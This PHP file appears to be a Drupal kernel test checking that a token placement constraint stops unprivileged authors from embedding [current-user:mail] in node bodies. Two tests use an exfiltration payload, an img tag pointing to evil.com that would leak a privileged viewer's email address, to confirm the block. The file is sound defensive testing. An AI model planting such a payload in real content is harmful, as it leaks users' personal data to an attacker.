<?php

declare(strict_types=1);

namespace Drupal\Tests\system\Kernel\Token;

use Drupal\Core\Render\BubbleableMetadata;
use Drupal\Core\TypedData\DataDefinition;
use Drupal\KernelTests\KernelTestBase;
use Drupal\Tests\node\Traits\ContentTypeCreationTrait;
use Drupal\Tests\user\Traits\UserCreationTrait;
use Drupal\node\Entity\Node;
use Drupal\user\Plugin\Token\CurrentUserToken;
use PHPUnit\Framework\Attributes\CoversClass;
use PHPUnit\Framework\Attributes\Group;
use PHPUnit\Framework\Attributes\RunTestsInSeparateProcesses;
use Symfony\Component\Validator\ConstraintViolationListInterface;

/**
 * Tests the [current-user] root token's placement gate and resolution parity.
 *
 * The root token is registered under input_type '' (identity ":current-user"),
 * which the resolution engine's routing never consults (see
 * testResolutionParityWithLegacyBridge()), so [current-user:*] output is
 * unchanged: this is what makes registering the plugin safe. What does change
 * immediately is placement: TokenPlacementConstraintValidator::walk() now
 * looks up the root definition before its per-segment loop, seeding the chain
 * with 'entity:user' so it can walk into user field access exactly like
 * [user:*] already does. That closes the exact gap in #3587726, where an
 * unprivileged author could place [current-user:mail] in content a privileged
 * viewer would later render, exfiltrating that viewer's own email address to
 * an attacker-controlled URL.
 *
 * @see \Drupal\Core\Token\Plugin\Validation\Constraint\TokenPlacementConstraintValidator
 * @see https://www.drupal.org/project/drupal/issues/3587726
 */
#[CoversClass(CurrentUserToken::class)]
#[Group('Token')]
#[RunTestsInSeparateProcesses]
class TokenPlacementCurrentUserTest extends KernelTestBase {

  use ContentTypeCreationTrait;
  use UserCreationTrait;

  /**
   * {@inheritdoc}
   */
  protected static $modules = [
    'system',
    'user',
    'field',
    'text',
    'filter',
    'node',
  ];

  /**
   * {@inheritdoc}
   */
  protected function setUp(): void {
    parent::setUp();
    $this->installSchema('node', ['node_access']);
    $this->installEntitySchema('user');
    $this->installEntitySchema('node');
    $this->installConfig(['filter', 'system', 'node']);
    $this->createContentType(['type' => 'page']);
  }

  /**
   * Validates a text value against the TokenPlacement constraint directly.
   */
  private function violationsFor(string $text): ConstraintViolationListInterface {
    $definition = DataDefinition::create('string')->addConstraint('TokenPlacement');
    return $this->container->get('typed_data_manager')->create($definition, $text)->validate();
  }

  /**
   * Tests the exact #3587726 repro is blocked for an unprivileged author.
   *
   * The body field auto-attaches the TokenPlacement constraint (system's
   * entity_bundle_field_info_alter hook gates every text-bearing field type,
   * and 'text_long' -- the body field's storage type -- is one of them).
   * [current-user:mail] walks the new root definition into the 'mail' base
   * field on 'entity:user', whose view access (checked with no entity bound)
   * is denied to an author without 'administer users' or 'view user email
   * addresses', exactly as it already is for the equivalent [user:mail] chain.
   */
  public function testExactReproIsBlocked(): void {
    $this->setUpCurrentUser(permissions: []);

    $node = Node::create([
      'type' => 'page',
      'title' => 'Exploit attempt',
      'body' => [
        'value' => '<img src="http://evil.com/?u=[current-user:mail]">',
        'format' => 'plain_text',
      ],
    ]);

    $violations = $node->validate()->getByField('body');
    $this->assertGreaterThan(0, $violations->count(), 'An author without administer users cannot place [current-user:mail] in the body field.');
  }

  /**
   * Tests an author with 'administer users' may save the same content.
   */
  public function testPermittedAuthorIsAllowed(): void {
    $this->setUpCurrentUser(permissions: ['administer users']);

    $node = Node::create([
      'type' => 'page',
      'title' => 'Trusted edit',
      'body' => [
        'value' => '<img src="http://evil.com/?u=[current-user:mail]">',
        'format' => 'plain_text',
      ],
    ]);

    $this->assertCount(0, $node->validate()->getByField('body'), 'An author with administer users may place [current-user:mail].');
  }

  /**
   * Tests [current-user:name] is never gated, regardless of permission.
   *
   * Verified reality: UserAccessControlHandler::checkFieldAccess() grants
   * 'view' on the 'name' base field unconditionally ("Allow view access to
   * anyone with access to the entity" -- and placement's null-entity check
   * never denies entity-level access either), independent of the author
   * holding 'administer users' or being the entity's own account (which the
   * placement check cannot determine anyway, since no entity is loaded). This
   * is exactly the point of the placement gate being per-field rather than
   * per-type: [current-user:mail] and [current-user:name] chain through the
   * identical root definition and the identical 'entity:user' lookup, and
   * still diverge in outcome purely on the target field's own access rules.
   */
  public function testNameFieldIsNeverGated(): void {
    $this->setUpCurrentUser(permissions: []);
    $this->assertCount(0, $this->violationsFor('[current-user:name]'), 'Without any special permission, [current-user:name] is allowed.');

    $this->setUpCurrentUser(permissions: ['administer users']);
    $this->assertCount(0, $this->violationsFor('[current-user:name]'), 'With administer users, [current-user:name] is still allowed.');
  }

  /**
   * Tests resolution parity: the unenforced tier still matches legacy output.
   *
   * This test calls Token::replace() with no 'viewer' option, so resolution
   * runs in the unenforced tier (ActorContext::isEnforced() is FALSE). The
   * engine's root-activation branch in generateWithMemo() only calls this
   * plugin's resolve() when a viewer is present, so in the unenforced tier
   * [current-user:mail] still falls through entirely to
   * LegacyTokenBridge::generate('current-user', ...), the exact call this test
   * makes directly for comparison. This is the tier real callers hit until
   * they are updated to pass 'viewer' (see the deprecation in
   * TokenResolutionEngine::resolveActor()); the enforced tier, where the root
   * plugin IS resolution-live, is covered by
   * TokenTieredEnforcementTest instead. Pinning byte-identical output here
   * proves the unenforced tier's legacy-equivalence guarantee holds even
   * though the plugin is registered.
   */
  public function testResolutionParityWithLegacyBridge(): void {
    $this->setUpCurrentUser(values: ['mail' => 'parity@example.com'], permissions: []);

    $bubbleable_metadata = new BubbleableMetadata();
    $legacy = $this->container->get('token.legacy_bridge')->generate(
      'current-user',
      ['mail' => '[current-user:mail]'],
      [],
      [],
      $bubbleable_metadata,
    );

    $replaced = $this->container->get('token')->replace('[current-user:mail]');

    $this->assertSame($legacy['[current-user:mail]'], $replaced, 'Token::replace() output for [current-user:mail] is byte-identical to the legacy bridge output.');
  }

}
